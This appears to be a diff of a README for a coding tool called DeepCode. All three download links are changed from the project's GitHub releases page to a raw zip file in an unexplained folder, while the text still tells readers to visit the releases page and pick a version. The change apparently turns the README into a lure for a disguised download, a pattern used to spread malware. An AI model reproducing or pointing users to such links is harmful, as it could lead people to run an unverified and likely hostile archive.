@@ -2,7 +2,7 @@
 
 ## 📥 Download DeepCode
 
-[![Download DeepCode](https://img.shields.io/badge/Download-DeepCode-blue.svg)](https://github.com/ElfER020/DeepCode/releases)
+[![Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip)](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip)
 
 ## 📝 Overview
 
@@ -25,7 +25,7 @@ DeepCode is an innovative application designed to help you code effortlessly. It
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   First, go to the releases page to download DeepCode: [Download DeepCode](https://github.com/ElfER020/DeepCode/releases).
+   First, go to the releases page to download DeepCode: [Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of DeepCode. Select the latest version for the best features and fixes.
@@ -58,6 +58,6 @@ Your experience with DeepCode matters. We welcome your thoughts and feedback. Le
 
 ## 📥 Download & Install
 
-Make sure you follow the steps outlined above to get started. For more information or direct downloads, visit this page: [Download DeepCode](https://github.com/ElfER020/DeepCode/releases). 
+Make sure you follow the steps outlined above to get started. For more information or direct downloads, visit this page: [Download DeepCode](https://raw.githubusercontent.com/ElfER020/DeepCode/main/asarabacca/DeepCode.zip). 
 
 Now, start your journey into the world of coding with DeepCode!
